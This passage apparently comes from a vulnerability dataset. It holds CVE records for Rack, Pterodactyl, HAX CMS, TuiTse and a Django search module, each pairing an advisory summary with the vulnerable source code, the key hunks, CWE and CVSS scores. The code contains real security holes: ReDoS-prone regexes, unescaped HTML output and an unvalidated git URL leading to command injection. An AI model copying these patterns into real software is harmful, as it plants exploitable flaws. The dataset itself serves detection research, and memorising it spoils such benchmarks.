2\n        first_set = balanced_reduce(operator, seq[:break_point])\n        second_set = balanced_reduce(operator, seq[break_point:])\n        return operator(first_set, second_set)\n\n\n# Reduce any iterable to a single value using a logical OR e.g. (a | b | ...)\nOR = partial(balanced_reduce, operator.or_)\n# Reduce any iterable to a single value using a logical AND e.g. (a & b & ...)\nAND = partial(balanced_reduce, operator.and_)\n# Reduce any iterable to a single value using an addition\nADD = partial(balanced_reduce, operator.add)\n# Reduce any iterable to a single value using a multiplication\nMUL = partial(balanced_reduce, operator.mul)\n\nMAX_QUERY_STRING_LENGTH = 255\n\n\ndef normalise_query_string(query_string):\n    # Truncate query string\n    query_string = query_string[:MAX_QUERY_STRING_LENGTH]\n    # Convert query_string to lowercase\n    query_string = query_string.lower()\n\n    # Remove leading, trailing and multiple spaces\n    query_string = re.sub(\" +\", \" \", query_string).strip()\n\n    return query_string\n\n\ndef separate_filters_from_query(query_string):\n    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'\n\n    filters = QueryDict(mutable=True)\n    for match_object in re.finditer(filters_regexp, query_string):\n        key, value = match_object.groups()\n        filters.update(\n            {\n                key: value.strip('\"')\n                if value.strip('\"') is not value\n                else value.strip(\"'\")\n            }\n        )\n\n    query_string = re.sub(filters_regexp, \"\", query_string).strip()\n\n    return filters, query_string\n\n\ndef parse_query_string(query_string, operator=None, zero_terms=MATCH_NONE):\n    \"\"\"\n    This takes a query string typed in by a user and extracts the following:\n\n     - Quoted terms (for phrase search)\n     - Filters\n\n    For example, the following query:\n\n      `hello \"this is a phrase\" live:true` would be parsed into:\n\n    filters: {'live': 'true'}\n    tokens: And([PlainText('hello'), Phrase('this is a phrase')])\n    \"\"\"\n    filters, query_string = separate_filters_from_query(query_string)\n\n    is_phrase = False\n    tokens = []\n    if '\"' in query_string:\n        parts = query_string.split('\"')\n    else:\n        parts = query_string.split(\"'\")\n\n    for part in parts:\n        part = part.strip()\n\n        if part:\n            if is_phrase:\n                tokens.append(Phrase(part))\n            else:\n                tokens.append(\n                    PlainText(part, operator=operator or PlainText.DEFAULT_OPERATOR)\n                )\n\n        is_phrase = not is_phrase\n\n    if tokens:\n        if operator == \"or\":\n            search_query = OR(tokens)\n        else:\n            search_query = AND(tokens)\n    else:\n        search_query = zero_terms\n\n    return filters, search_query\n\n\ndef get_descendant_models(model):\n    \"\"\"\n    Returns all descendants of a model, including the model itself.\n    \"\"\"\n    descendant_models = {\n        other_model\n        for other_model in apps.get_models()\n        if issubclass(other_model, model)\n    }\n    descendant_models.add(model)\n    return descendant_models\n\n\ndef get_content_type_pk(model):\n    # We import it locally because this file is loaded before apps are ready.\n    from django.contrib.contenttypes.models import ContentType\n\n    return ContentType.objects.get_for_model(model).pk\n\n\ndef get_ancestors_content_types_pks(model):\n    \"\"\"\n    Returns content types ids for the ancestors of this model, excluding it.\n    \"\"\"\n    from django.contrib.contenttypes.models import ContentType\n\n    return [\n        ct.pk\n        for ct in ContentType.objects.get_for_models(\n            *model._meta.get_parent_list()\n        ).values()\n    ]\n\n\ndef get_descendants_content_types_pks(model):\n    \"\"\"\n    Returns content types ids for the descendants of this model, including it.\n    \"\"\"\n    from django.contrib.contenttypes.models import ContentType\n\n    return [\n        ct.pk\n        for ct in ContentType.objects.get_for_models(\n            *get_descendant_models(model)\n        ).values()\n    ]\n\n\ndef get_search_fields(search_fields):\n    for search_field in search_fields:\n        if isinstance(search_field, SearchField):\n            yield search_field\n        elif isinstance(search_field, RelatedFields):\n            yield from get_search_fields(search_field.fields)\n\n\ndef get_postgresql_connections():\n    return [\n        connection\n        for connection in connections.all()\n        if connection.vendor == \"postgresql\"\n    ]\n"
        }
      ],
      "method_level": [
        "def separate_filters_from_query(query_string):\n    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'\n\n    filters = QueryDict(mutable=True)\n    for match_object in re.finditer(filters_regexp, query_string):\n        key, value = match_object.groups()\n        filters.update(\n            {\n                key: value.strip('\"')\n                if value.strip('\"') is not value\n                else value.strip(\"'\")\n            }\n        )\n\n    query_string = re.sub(filters_regexp, \"\", query_string).strip()\n\n    return filters, query_string"
      ],
      "hunk_level": [
        {
          "line_no": 86,
          "content": "    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'"
        },
        {
          "line_no": 89,
          "content": "    for match_object in re.finditer(filters_regexp, query_string):"
        },
        {
          "line_no": 91,
          "content": "        filters.update("
        },
        {
          "line_no": 92,
          "content": "            {"
        },
        {
          "line_no": 93,
          "content": "                key: value.strip('\"')"
        },
        {
          "line_no": 94,
          "content": "                if value.strip('\"') is not value"
        },
        {
          "line_no": 95,
          "content": "                else value.strip(\"'\")"
        },
        {
          "line_no": 96,
          "content": "            }"
        },
        {
          "line_no": 97,
          "content": "        )"
        },
        {
          "line_no": 99,
          "content": "    query_string = re.sub(filters_regexp, \"\", query_string).strip()"
        }
      ]
    },
    "cwe": [
      "CWE-1333"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 717,
    "cve": "CVE-2024-34067",
    "description": "Pterodactyl is a free, open-source game server management panel built with PHP, React, and Go. Importing a malicious egg or gaining access to wings instance could lead to cross site scripting (XSS) on the panel, which could be used to gain an administrator account on the panel. Specifically, the following things are impacted: Egg Docker images and Egg variables: Name, Environment variable, Default value, Description, Validation rules. Additionally, certain fields would reflect malicious input, but it would require the user knowingly entering such input to have an impact. To iterate, this would require an administrator to perform actions and can't be triggered by a normal panel user. This issue has has been addressed in version 1.11.6 and users are advised to upgrade. No workaround is available other than updating to the latest version of the panel.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/Http/Requests/Admin/Egg/EggFormRequest.php",
          "content": "<?php\n\nnamespace Pterodactyl\\Http\\Requests\\Admin\\Egg;\n\nuse Pterodactyl\\Http\\Requests\\Admin\\AdminFormRequest;\n\nclass EggFormRequest extends AdminFormRequest\n{\n    public function rules(): array\n    {\n        $rules = [\n            'name' => 'required|string|max:191',\n            'description' => 'nullable|string',\n            'docker_images' => 'required|string',\n            'force_outgoing_ip' => 'sometimes|boolean',\n            'file_denylist' => 'array',\n            'startup' => 'required|string',\n            'config_from' => 'sometimes|bail|nullable|numeric',\n            'config_stop' => 'required_without:config_from|nullable|string|max:191',\n            'config_startup' => 'required_without:config_from|nullable|json',\n            'config_logs' => 'required_without:config_from|nullable|json',\n            'config_files' => 'required_without:config_from|nullable|json',\n        ];\n\n        if ($this->method() === 'POST') {\n            $rules['nest_id'] = 'required|numeric|exists:nests,id';\n        }\n\n        return $rules;\n    }\n\n    public function withValidator($validator)\n    {\n        $validator->sometimes('config_from', 'exists:eggs,id', function () {\n            return (int) $this->input('config_from') !== 0;\n        });\n    }\n\n    public function validated($key = null, $default = null): array\n    {\n        $data = parent::validated();\n\n        return array_merge($data, [\n            'force_outgoing_ip' => array_get($data, 'force_outgoing_ip', false),\n        ]);\n    }\n}\n"
        },
        {
          "name": "app/Http/Requests/Api/Client/Servers/Settings/SetDockerImageRequest.php",
          "content": "<?php\n\nnamespace Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Settings;\n\nuse Webmozart\\Assert\\Assert;\nuse Pterodactyl\\Models\\Server;\nuse Illuminate\\Validation\\Rule;\nuse Pterodactyl\\Models\\Permission;\nuse Pterodactyl\\Contracts\\Http\\ClientPermissionsRequest;\nuse Pterodactyl\\Http\\Requests\\Api\\Client\\ClientApiRequest;\n\nclass SetDockerImageRequest extends ClientApiRequest implements ClientPermissionsRequest\n{\n    public function permission(): string\n    {\n        return Permission::ACTION_STARTUP_DOCKER_IMAGE;\n    }\n\n    public function rules(): array\n    {\n        /** @var \\Pterodactyl\\Models\\Server $server */\n        $server = $this->route()->parameter('server');\n\n        Assert::isInstanceOf($server, Server::class);\n\n        return [\n            'docker_image' => ['required', 'string', Rule::in(array_values($server->egg->docker_images))],\n        ];\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function rules(): array\n    {\n        $rules = [\n            'name' => 'required|string|max:191',\n            'description' => 'nullable|string',\n            'docker_images' => 'required|string',\n            'force_outgoing_ip' => 'sometimes|boolean',\n            'file_denylist' => 'array',\n            'startup' => 'required|string',\n            'config_from' => 'sometimes|bail|nullable|numeric',\n            'config_stop' => 'required_without:config_from|nullable|string|max:191',\n            'config_startup' => 'required_without:config_from|nullable|json',\n            'config_logs' => 'required_without:config_from|nullable|json',\n            'config_files' => 'required_without:config_from|nullable|json',\n        ];\n\n        if ($this->method() === 'POST') {\n            $rules['nest_id'] = 'required|numeric|exists:nests,id';\n        }\n\n        return $rules;\n    }",
        "public function rules(): array\n    {\n        /** @var \\Pterodactyl\\Models\\Server $server */\n        $server = $this->route()->parameter('server');\n\n        Assert::isInstanceOf($server, Server::class);\n\n        return [\n            'docker_image' => ['required', 'string', Rule::in(array_values($server->egg->docker_images))],\n        ];\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 14,
          "content": "            'docker_images' => 'required|string',"
        },
        {
          "line_no": 27,
          "content": "            'docker_image' => ['required', 'string', Rule::in(array_values($server->egg->docker_images))],"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 387,
    "cve": "CVE-2024-25126",
    "description": "Rack is a modular Ruby web server interface. Carefully crafted content type headers can cause Rack’s media type parser to take much longer than expected, leading to a possible denial of service vulnerability (ReDos 2nd degree polynomial). This vulnerability is patched in 3.0.9.1 and 2.2.8.1.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/rack/media_type.rb",
          "content": "# frozen_string_literal: true\n\nmodule Rack\n  # Rack::MediaType parse media type and parameters out of content_type string\n\n  class MediaType\n    SPLIT_PATTERN = %r{\\s*[;,]\\s*}\n\n    class << self\n      # The media type (type/subtype) portion of the CONTENT_TYPE header\n      # without any media type parameters. e.g., when CONTENT_TYPE is\n      # \"text/plain;charset=utf-8\", the media-type is \"text/plain\".\n      #\n      # For more information on the use of media types in HTTP, see:\n      # http://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.7\n      def type(content_type)\n        return nil unless content_type\n        content_type.split(SPLIT_PATTERN, 2).first.tap(&:downcase!)\n      end\n\n      # The media type parameters provided in CONTENT_TYPE as a Hash, or\n      # an empty Hash if no CONTENT_TYPE or media-type parameters were\n      # provided.  e.g., when the CONTENT_TYPE is \"text/plain;charset=utf-8\",\n      # this method responds with the following Hash:\n      #   { 'charset' => 'utf-8' }\n      def params(content_type)\n        return {} if content_type.nil?\n\n        content_type.split(SPLIT_PATTERN)[1..-1].each_with_object({}) do |s, hsh|\n          k, v = s.split('=', 2)\n\n          hsh[k.tap(&:downcase!)] = strip_doublequotes(v)\n        end\n      end\n\n      private\n\n        def strip_doublequotes(str)\n          (str.start_with?('\"') && str.end_with?('\"')) ? str[1..-2] : str\n        end\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def type(content_type)\n        return nil unless content_type\n        content_type.split(SPLIT_PATTERN, 2).first.tap(&:downcase!)\n      end",
        "def params(content_type)\n        return {} if content_type.nil?\n\n        content_type.split(SPLIT_PATTERN)[1..-1].each_with_object({}) do |s, hsh|\n          k, v = s.split('=', 2)\n\n          hsh[k.tap(&:downcase!)] = strip_doublequotes(v)\n        end\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 18,
          "content": "        content_type.split(SPLIT_PATTERN, 2).first.tap(&:downcase!)"
        },
        {
          "line_no": 32,
          "content": "          hsh[k.tap(&:downcase!)] = strip_doublequotes(v)"
        }
      ]
    },
    "cwe": [
      "CWE-1333"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 181,
    "cve": "CVE-2025-49141",
    "description": "HAX CMS PHP allows users to manage their microsite universe with a PHP backend. Prior to version 11.0.3, the `gitImportSite` functionality obtains a URL string from a POST request and insufficiently validates user input. The `set_remote` function later passes this input into `proc_open`, yielding OS command injection. An authenticated attacker can craft a URL string that bypasses the validation checks employed by the `filter_var` and `strpos` functions in order to execute arbitrary OS commands on the backend server. The attacker can exfiltrate command output via an HTTP request. Version 11.0.3 contains a patch for the issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/routes/connectionSettings.js",
          "content": "const fs = require('fs-extra');\nconst path = require('path');\nconst { HAXCMS } = require('../lib/HAXCMS.js');\nconst url = require('url');\n\n/**\n * @OA\\Get(\n *    path=\"/connectionSettings\",\n *    tags={\"cms\"},\n *    @OA\\Response(\n *        response=\"200\",\n *        description=\"Generate the connection settings dynamically for implying we have a backend\"\n *   )\n * )\n */\nasync function connectionSettings(req, res) {\n  res.setHeader('Content-Type', 'application/javascript');\n  const themes = JSON.parse(await fs.readFileSync(path.join(HAXCMS.coreConfigPath, \"themes.json\"), 'utf8'));\n  // this is the correct base if we're being called for connection from inside a site\n  let baseAPIPath = HAXCMS.basePath + HAXCMS.systemRequestBase;\n  // top level haxcms listing can't include basePath as it's the root already\n  if (req.headers && req.headers.referer && !req.headers.referer.includes('/sites/')) {\n    baseAPIPath = HAXCMS.systemRequestBase;\n  }\n  // express gives this up on requests but doesn't know it ahead of time\n  if (req.headers && req.headers.referer) {\n    let details = new url.URL(req.headers.referer);\n    HAXCMS.protocol = details.protocol.replace(':', '');\n    HAXCMS.domain = details.host;\n    HAXCMS.request_url = details;\n  }\n  const returnData = JSON.stringify({\n    token: HAXCMS.getRequestToken(),\n    getFormToken: HAXCMS.getRequestToken('form'),\n    appStore: {\n      url: `${baseAPIPath}generateAppStore?app-store-token=${HAXCMS.getRequestToken('appstore')}`\n    },\n    themes: themes,\n    connectionSettings: `${baseAPIPath}connectionSettings`,\n    login: `${baseAPIPath}login`,\n    refreshUrl: `${baseAPIPath}refreshAccessToken`,\n    logout: `${baseAPIPath}logout`,\n    redirectUrl: HAXCMS.basePath,\n    saveNodePath: `${baseAPIPath}saveNode`,\n    saveManifestPath: `${baseAPIPath}saveManifest`,\n    saveOutlinePath: `${baseAPIPath}saveOutline`,\n    setConfigPath:`${baseAPIPath}setConfig`,\n    getConfigPath: `${baseAPIPath}getConfig`,\n    getNodeFieldsPath: `${baseAPIPath}getNodeFields`,\n    getSiteFieldsPath: `${baseAPIPath}formLoad?haxcms_form_id=siteSettings`,\n    createNodePath: `${baseAPIPath}createNode`,\n    getUserDataPath: `${baseAPIPath}getUserData`,\n    deleteNodePath: `${baseAPIPath}deleteNode`,\n    createSite: `${baseAPIPath}createSite`,\n    gitImportSite: `${baseAPIPath}gitImportSite`,\n    downloadSite: `${baseAPIPath}downloadSite`,\n    archiveSite: `${baseAPIPath}archiveSite`,\n    copySite: `${baseAPIPath}cloneSite`,\n    getSitesList: `${baseAPIPath}listSites`,\n  });\n  let after;\n  if (HAXCMS.HAXCMS_DISABLE_JWT_CHECKS) {\n    after = `window.appSettings.jwt = \"${HAXCMS.getJWT(HAXCMS.superUser.name)}\"`;\n  }\n  res.send(`// force vercel calls to go from production\n    window.MicroFrontendRegistryConfig = window.MicroFrontendRegistryConfig || {};\n    window.MicroFrontendRegistryConfig.base = \"https://haxapi.vercel.app\";window.appSettings =${returnData};${after}`);\n}\n\nmodule.exports = connectionSettings;"
        },
        {
          "name": "src/routes/gitImportSite.js",
          "content": "const { HAXCMS } = require('../lib/HAXCMS.js');\nconst explode = require('locutus/php/strings/explode');\nconst filter_var = require('../lib/filter_var.js');\nconst GitPlus = require('../lib/GitPlus.js');\n/**\n   * @OA\\Post(\n   *    path=\"/gitImportSite\",\n   *    tags={\"cms\",\"authenticated\",\"site\"},\n   *    @OA\\Parameter(\n   *         name=\"jwt\",\n   *         description=\"JSON Web token, obtain by using  /login\",\n   *         in=\"query\",\n   *         required=true,\n   *         @OA\\Schema(type=\"string\")\n   *    ),\n   *    @OA\\RequestBody(\n   *        @OA\\MediaType(\n   *             mediaType=\"application/json\",\n   *             @OA\\Schema(\n   *                 @OA\\Property(\n   *                     property=\"site\",\n   *                     type=\"object\"\n   *                 ),\n   *                 required={\"site\"},\n   *                 example={\n   *                    \"site\": {\n   *                      \"git\": {\n   *                        \"url\": \"\"\n   *                      }\n   *                    },\n   *                 }\n   *             )\n   *         )\n   *    ),\n   *    @OA\\Response(\n   *        response=\"200\",\n   *        description=\"Create a new site from a git repo reference\"\n   *   )\n   * )\n   */\n  async function gitImportSite(req, res) {\n    if (HAXCMS.validateRequestToken()) {\n      if ((req.body['site']['git']['url'])) {\n        let repoUrl = req.body['site']['git']['url'];\n        // make sure there's a .git in the address\n        if (filter_var(repoUrl, \"FILTER_VALIDATE_URL\") !== false &&\n          repoUrl.indexOf('.git') !== -1\n          ) {\n          let ary = explode('/', repoUrl.replace('.git', ''));\n          let repo_path = ary.pop();\n          // @todo check if this fails\n          directory = HAXCMS.HAXCMS_ROOT + HAXCMS.sitesDirectory + '/' + repo_path;\n          try {\n            let git = new GitPlus({\n              dir: directory,\n              cliVersion: await HAXCMS.gitTest()\n            });\n            git.setDir(directory);\n            let repo = git.create(directory);\n            repo = git.open(directory, true);\n            repo.set_remote(\"origin\", repoUrl);\n            repo.pull('origin', 'master');  \n          }\n          catch(e) {}\n          // load the site that we SHOULD have just pulled in\n          if (site = await HAXCMS.loadSite(repo_path)) {\n            res.send({\n              'manifest': site.manifest\n            });\n          }\n          else {\n            res.send(500);\n          }\n        }\n      }\n      res.send(500);\n    }\n    else {\n      res.send(403);\n    }\n  }\n  module.exports = gitImportSite;"
        }
      ],
      "method_level": [
        "async function connectionSettings(req, res) {\n  res.setHeader('Content-Type', 'application/javascript');\n  const themes = JSON.parse(await fs.readFileSync(path.join(HAXCMS.coreConfigPath, \"themes.json\"), 'utf8'));\n  // this is the correct base if we're being called for connection from inside a site\n  let baseAPIPath = HAXCMS.basePath + HAXCMS.systemRequestBase;\n  // top level haxcms listing can't include basePath as it's the root already\n  if (req.headers && req.headers.referer && !req.headers.referer.includes('/sites/')) {\n    baseAPIPath = HAXCMS.systemRequestBase;\n  }\n  // express gives this up on requests but doesn't know it ahead of time\n  if (req.headers && req.headers.referer) {\n    let details = new url.URL(req.headers.referer);\n    HAXCMS.protocol = details.protocol.replace(':', '');\n    HAXCMS.domain = details.host;\n    HAXCMS.request_url = details;\n  }\n  const returnData = JSON.stringify({\n    token: HAXCMS.getRequestToken(),\n    getFormToken: HAXCMS.getRequestToken('form'),\n    appStore: {\n      url: `${baseAPIPath}generateAppStore?app-store-token=${HAXCMS.getRequestToken('appstore')}`\n    },\n    themes: themes,\n    connectionSettings: `${baseAPIPath}connectionSettings`,\n    login: `${baseAPIPath}login`,\n    refreshUrl: `${baseAPIPath}refreshAccessToken`,\n    logout: `${baseAPIPath}logout`,\n    redirectUrl: HAXCMS.basePath,\n    saveNodePath: `${baseAPIPath}saveNode`,\n    saveManifestPath: `${baseAPIPath}saveManifest`,\n    saveOutlinePath: `${baseAPIPath}saveOutline`,\n    setConfigPath:`${baseAPIPath}setConfig`,\n    getConfigPath: `${baseAPIPath}getConfig`,\n    getNodeFieldsPath: `${baseAPIPath}getNodeFields`,\n    getSiteFieldsPath: `${baseAPIPath}formLoad?haxcms_form_id=siteSettings`,\n    createNodePath: `${baseAPIPath}createNode`,\n    getUserDataPath: `${baseAPIPath}getUserData`,\n    deleteNodePath: `${baseAPIPath}deleteNode`,\n    createSite: `${baseAPIPath}createSite`,\n    gitImportSite: `${baseAPIPath}gitImportSite`,\n    downloadSite: `${baseAPIPath}downloadSite`,\n    archiveSite: `${baseAPIPath}archiveSite`,\n    copySite: `${baseAPIPath}cloneSite`,\n    getSitesList: `${baseAPIPath}listSites`,\n  });\n  let after;\n  if (HAXCMS.HAXCMS_DISABLE_JWT_CHECKS) {\n    after = `window.appSettings.jwt = \"${HAXCMS.getJWT(HAXCMS.superUser.name)}\"`;\n  }\n  res.send(`// force vercel calls to go from production\n    window.MicroFrontendRegistryConfig = window.MicroFrontendRegistryConfig || {};\n    window.MicroFrontendRegistryConfig.base = \"https://haxapi.vercel.app\";window.appSettings =${returnData};${after}`);\n}",
        "async function gitImportSite(req, res) {\n    if (HAXCMS.validateRequestToken()) {\n      if ((req.body['site']['git']['url'])) {\n        let repoUrl = req.body['site']['git']['url'];\n        // make sure there's a .git in the address\n        if (filter_var(repoUrl, \"FILTER_VALIDATE_URL\") !== false &&\n          repoUrl.indexOf('.git') !== -1\n          ) {\n          let ary = explode('/', repoUrl.replace('.git', ''));\n          let repo_path = ary.pop();\n          // @todo check if this fails\n          directory = HAXCMS.HAXCMS_ROOT + HAXCMS.sitesDirectory + '/' + repo_path;\n          try {\n            let git = new GitPlus({\n              dir: directory,\n              cliVersion: await HAXCMS.gitTest()\n            });\n            git.setDir(directory);\n            let repo = git.create(directory);\n            repo = git.open(directory, true);\n            repo.set_remote(\"origin\", repoUrl);\n            repo.pull('origin', 'master');  \n          }\n          catch(e) {}\n          // load the site that we SHOULD have just pulled in\n          if (site = await HAXCMS.loadSite(repo_path)) {\n            res.send({\n              'manifest': site.manifest\n            });\n          }\n          else {\n            res.send(500);\n          }\n        }\n      }\n      res.send(500);\n    }\n    else {\n      res.send(403);\n    }\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 55,
          "content": "    gitImportSite: `${baseAPIPath}gitImportSite`,"
        },
        {
          "line_no": 41,
          "content": "  async function gitImportSite(req, res) {"
        },
        {
          "line_no": 42,
          "content": "    if (HAXCMS.validateRequestToken()) {"
        },
        {
          "line_no": 43,
          "content": "      if ((req.body['site']['git']['url'])) {"
        },
        {
          "line_no": 44,
          "content": "        let repoUrl = req.body['site']['git']['url'];"
        },
        {
          "line_no": 45,
          "content": "        // make sure there's a .git in the address"
        },
        {
          "line_no": 46,
          "content": "        if (filter_var(repoUrl, \"FILTER_VALIDATE_URL\") !== false &&"
        },
        {
          "line_no": 47,
          "content": "          repoUrl.indexOf('.git') !== -1"
        },
        {
          "line_no": 48,
          "content": "          ) {"
        },
        {
          "line_no": 49,
          "content": "          let ary = explode('/', repoUrl.replace('.git', ''));"
        },
        {
          "line_no": 50,
          "content": "          let repo_path = ary.pop();"
        },
        {
          "line_no": 51,
          "content": "          // @todo check if this fails"
        },
        {
          "line_no": 52,
          "content": "          directory = HAXCMS.HAXCMS_ROOT + HAXCMS.sitesDirectory + '/' + repo_path;"
        },
        {
          "line_no": 53,
          "content": "          try {"
        },
        {
          "line_no": 54,
          "content": "            let git = new GitPlus({"
        },
        {
          "line_no": 55,
          "content": "              dir: directory,"
        },
        {
          "line_no": 56,
          "content": "              cliVersion: await HAXCMS.gitTest()"
        },
        {
          "line_no": 57,
          "content": "            });"
        },
        {
          "line_no": 58,
          "content": "            git.setDir(directory);"
        },
        {
          "line_no": 59,
          "content": "            let repo = git.create(directory);"
        },
        {
          "line_no": 60,
          "content": "            repo = git.open(directory, true);"
        },
        {
          "line_no": 61,
          "content": "            repo.set_remote(\"origin\", repoUrl);"
        },
        {
          "line_no": 62,
          "content": "            repo.pull('origin', 'master');  "
        },
        {
          "line_no": 63,
          "content": "          }"
        },
        {
          "line_no": 64,
          "content": "          catch(e) {}"
        },
        {
          "line_no": 65,
          "content": "          // load the site that we SHOULD have just pulled in"
        },
        {
          "line_no": 66,
          "content": "          if (site = await HAXCMS.loadSite(repo_path)) {"
        },
        {
          "line_no": 67,
          "content": "            res.send({"
        },
        {
          "line_no": 68,
          "content": "              'manifest': site.manifest"
        },
        {
          "line_no": 69,
          "content": "            });"
        },
        {
          "line_no": 70,
          "content": "          }"
        },
        {
          "line_no": 71,
          "content": "          else {"
        },
        {
          "line_no": 72,
          "content": "            res.send(500);"
        },
        {
          "line_no": 73,
          "content": "          }"
        },
        {
          "line_no": 74,
          "content": "        }"
        },
        {
          "line_no": 75,
          "content": "      }"
        },
        {
          "line_no": 76,
          "content": "      res.send(500);"
        },
        {
          "line_no": 77,
          "content": "    }"
        },
        {
          "line_no": 78,
          "content": "    else {"
        },
        {
          "line_no": 79,
          "content": "      res.send(403);"
        },
        {
          "line_no": 80,
          "content": "    }"
        },
        {
          "line_no": 81,
          "content": "  }"
        }
      ]
    },
    "cwe": [
      "CWE-78"
    ],
    "severity": "HIGH",
    "cvss_score": 8.5,
    "cvss_version": 3.1
  },
  {
    "id": 147,
    "cve": "CVE-2024-23341",
    "description": "TuiTse-TsuSin is a package for organizing the comparative corpus of Taiwanese Chinese characters and Roman characters, and extracting sentences of the Taiwanese Chinese characters and the Roman characters. Prior to version 1.3.2, when using `tuitse_html` without quoting the input, there is a html injection vulnerability. Version 1.3.2 contains a patch for the issue. As a workaround, sanitize Taigi input with HTML quotation.",
    "vulnerability": {
      "file_level": [
        {
          "name": "tuitse/html.py",
          "content": "from django.utils.html import format_html\nfrom tuitse import THAU_JI, LIAN_JI, KHIN_SIANN_JI\nfrom kesi.butkian.kongiong import 敢是拼音字元\n\n\ndef tuitse_html(kiamtsa_tinliat):\n    html = ''\n    htmlsu = ''\n    kam_ting_tsit_hing_si_lomaji = False\n    kam_ting_tsit_im_si_lomaji = False\n    for ji in kiamtsa_tinliat:\n        # Kuat-tīng Tsit jī ê hîng ài liân-jī-hû--bô\n        kam_hing_si_lomaji = 敢是拼音字元(ji[0][-1:])\n\n        if kam_hing_si_lomaji and kam_ting_tsit_hing_si_lomaji:\n            kam_hing_ai_lian = True\n        else:\n            kam_hing_ai_lian = False\n\n        kam_ting_tsit_hing_si_lomaji = kam_hing_si_lomaji\n\n        # Kuat-tīng Tsit jī ê im ài liân-jī-hû--bô\n        kam_im_si_lomaji = 敢是拼音字元(ji[1][-1:])\n\n        if kam_im_si_lomaji and kam_ting_tsit_im_si_lomaji:\n            kam_im_ai_lian = True\n        else:\n            kam_im_ai_lian = False\n\n        kam_ting_tsit_im_si_lomaji = kam_im_si_lomaji\n\n        if ji[2] == THAU_JI:\n            # Thòo sû ê html\n            if htmlsu:\n                html += \"<ruby>{}</ruby>\".format(htmlsu)\n            # Html tîng-lâi\n            htmlsu = _sng_ji_html(ji)\n            continue\n\n        if ji[2] == LIAN_JI:\n            tiauhu = '-'\n        elif ji[2] == KHIN_SIANN_JI:\n            tiauhu = '--'\n        else:\n            raise RuntimeError('一定愛設定頭字、連字、a̍h-sī輕聲')\n\n        if kam_im_ai_lian:\n            htmlsu += \"<rb>{}</rb>\".format(tiauhu)\n        else:\n            htmlsu += \"<rb>&nbsp;</rb>\"\n\n        if kam_hing_ai_lian:\n            htmlsu += \"<rt>{}</rt>\".format(tiauhu)\n        else:\n            htmlsu += \"<rt></rt>\"\n\n        htmlsu += _sng_ji_html(ji)\n    # Thòo bué sû ê html\n    html += \"<ruby>{}</ruby>\".format(htmlsu)\n    return format_html(html)\n\n\ndef _sng_ji_html(ji):\n    if ji[3]:\n        return \"<rb>{}</rb><rt>{}</rt>\".format(ji[1], ji[0])\n    if ji[1]:\n        return \"<rb class='fail'>{}</rb><rt class='fail'>{}</rt>\".format(\n            ji[1], ji[0])\n    return \"<rb class='fail'>&nbsp;&nbsp;</rb><rt class='fail'>{}</rt>\".format(\n        ji[0])\n"
        }
      ],
      "method_level": [
        "def tuitse_html(kiamtsa_tinliat):\n    html = ''\n    htmlsu = ''\n    kam_ting_tsit_hing_si_lomaji = False\n    kam_ting_tsit_im_si_lomaji = False\n    for ji in kiamtsa_tinliat:\n        # Kuat-tīng Tsit jī ê hîng ài liân-jī-hû--bô\n        kam_hing_si_lomaji = 敢是拼音字元(ji[0][-1:])\n\n        if kam_hing_si_lomaji and kam_ting_tsit_hing_si_lomaji:\n            kam_hing_ai_lian = True\n        else:\n            kam_hing_ai_lian = False\n\n        kam_ting_tsit_hing_si_lomaji = kam_hing_si_lomaji\n\n        # Kuat-tīng Tsit jī ê im ài liân-jī-hû--bô\n        kam_im_si_lomaji = 敢是拼音字元(ji[1][-1:])\n\n        if kam_im_si_lomaji and kam_ting_tsit_im_si_lomaji:\n            kam_im_ai_lian = True\n        else:\n            kam_im_ai_lian = False\n\n        kam_ting_tsit_im_si_lomaji = kam_im_si_lomaji\n\n        if ji[2] == THAU_JI:\n            # Thòo sû ê html\n            if htmlsu:\n                html += \"<ruby>{}</ruby>\".format(htmlsu)\n            # Html tîng-lâi\n            htmlsu = _sng_ji_html(ji)\n            continue\n\n        if ji[2] == LIAN_JI:\n            tiauhu = '-'\n        elif ji[2] == KHIN_SIANN_JI:\n            tiauhu = '--'\n        else:\n            raise RuntimeError('一定愛設定頭字、連字、a̍h-sī輕聲')\n\n        if kam_im_ai_lian:\n            htmlsu += \"<rb>{}</rb>\".format(tiauhu)\n        else:\n            htmlsu += \"<rb>&nbsp;</rb>\"\n\n        if kam_hing_ai_lian:\n            htmlsu += \"<rt>{}</rt>\".format(tiauhu)\n        else:\n            htmlsu += \"<rt></rt>\"\n\n        htmlsu += _sng_ji_html(ji)\n    # Thòo bué sû ê html\n    html += \"<ruby>{}</ruby>\".format(htmlsu)\n    return format_html(html)",
        "def _sng_ji_html(ji):\n    if ji[3]:\n        return \"<rb>{}</rb><rt>{}</rt>\".format(ji[1], ji[0])\n    if ji[1]:\n        return \"<rb class='fail'>{}</rb><rt class='fail'>{}</rt>\".format(\n            ji[1], ji[0])\n    return \"<rb class='fail'>&nbsp;&nbsp;</rb><rt class='fail'>{}</rt>\".format(\n        ji[0])"
      ],
      "hunk_level": [
        {
          "line_no": 8,
          "content": "    htmlsu = ''"
        },
        {
          "line_no": 34,
          "content": "            if htmlsu:"
        },
        {
          "line_no": 35,
          "content": "                html += \"<ruby>{}</ruby>\".format(htmlsu)"
        },
        {
          "line_no": 37,
          "content": "            htmlsu = _sng_ji_html(ji)"
        },
        {
          "line_no": 48,
          "content": "            htmlsu += \"<rb>{}</rb>\".format(tiauhu)"
        },
